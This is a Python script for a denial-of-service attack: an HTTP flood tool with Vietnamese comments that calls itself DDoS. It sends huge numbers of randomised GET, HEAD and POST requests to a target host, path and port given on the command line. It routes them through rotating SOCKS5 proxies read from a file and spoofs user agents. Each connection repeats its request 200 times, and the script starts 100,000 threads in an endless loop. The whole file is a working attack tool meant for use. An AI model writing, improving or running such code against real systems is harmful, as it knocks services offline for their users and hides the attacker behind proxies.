from socket import socket
from python_socks.sync import Proxy
import random
import time
import ssl
import threading
import multiprocessing
import sys
import time
import sys

CHARACTERS = "qwertyuioplkjhgfdsazxcvbnm"

def randomParams():
    return "?" + str(random.randint(10000000, 271400281257)) + random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257))+random.choice(CHARACTERS) + random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257))+random.choice(CHARACTERS) + random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + "=" + random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257))

def getUserAgent():
    osList = [
        "iOS",
        "Windows",
        "X11",
        "Android",
    ]
    ios = [
        "iPhone; CPU iPhone OS 13_3 like Mac OS X",
        "iPad; CPU OS 13_3 like Mac OS X",
        "iPod touch; iPhone OS 4.3.3",
        "iPod touch; CPU iPhone OS 12_0 like Mac OS X",
    ]
    android = [
        "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
        "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
        "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
        "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
        "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
        "Linux; Android 6.0; Nexus 5 Build/MRA58N",
        "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
        "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
        "Linux; Android 9.0; SAMSUNG SM-G950U",
    ]
    windows = [
        "Windows NT 10.0; Win64; X64",
        "Windows NT 10.0; WOW64",
        "Windows NT 5.1; rv:7.0.1",
        "Windows NT 6.1; WOW64; rv:54.0",
        "Windows NT 6.3; Win64; x64",
        "Windows NT 6.3; WOW64; rv:13.37",
    ]
    x11 = [
        "X11; Linux x86_64",
        "X11; Ubuntu; Linux i686",
        "SMART-TV; Linux; Tizen 2.4.0",
        "X11; Ubuntu; Linux x86_64",
        "X11; U; Linux amd64",
        "X11; GNU/LINUX",
        "X11; CrOS x86_64 11337.33.7",
        "X11; Debian; Linux x86_64",
    ]
    osName = random.choice(osList)
    if osName == "iOS":
        version = random.choice(ios)
    if osName == "Android":
        version = random.choice(android)
    if osName == "Windows":
        version = random.choice(windows)
    if osName == "X11":
        version = random.choice(x11)
    return "Mozzila 5.0 " + "(" + version + ")" + " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str(random.randint(60, 91)) + ".0." + str(random.randint(4000, 5000)) + "." + str(random.randint(40, 60)) + " Safari/537.36"

def getUserAgents(number):
    userAgents = []
    for _ in range(number):
        userAgents.append(getUserAgent())
    return userAgents

def readLines(fileName):
    return open(fileName).readlines()

def makeRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH):
    for hehe in range(1,300):
        _PROXY = random.choice(_PROXIES)
        _USERAGENT = random.choice(_USERAGENTS)
        a22=['GET ','HEAD ','POST ']
        a321=random.choice(a22)
        _HEADERS = a321 + _PATH + randomParams() + " HTTP/1.3\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://zingfast.net/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
        _PROXY = _PROXY.strip()
        try:
            proxyDialer = Proxy.from_url('socks5://' + _PROXY) # Thay đổi socks4 thành socks5 nếu dùng socks5 và ngược lại
            conn = proxyDialer.connect(dest_host=_HOST, dest_port=_PORT)
            if _PORT == 443:
                conn = ssl.create_default_context().wrap_socket(conn, server_hostname=_HOST)
            try:
                for ifghhgf in range(1,200):
                    conn.send(_HEADERS.encode())

                conn.close()
            except:
                conn.close()
        except:
            sgdfgsdfgs=345
            
def main():
    _HOST = sys.argv[1]
    _PORT = int(sys.argv[2])
    _PATH = sys.argv[3]
    _FILE = sys.argv[4]
    _USERAGENTS = getUserAgents(10000)
    _PROXIES = readLines(_FILE)
    while True:
        for hahh in range(100000):
                thread = threading.Thread(target=makeRequests, args=(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH, ),daemon=True)
                thread.start()
        time.sleep(30) # Thời gian DDoS (s)
import multiprocessing
print("Attacking...")
main()
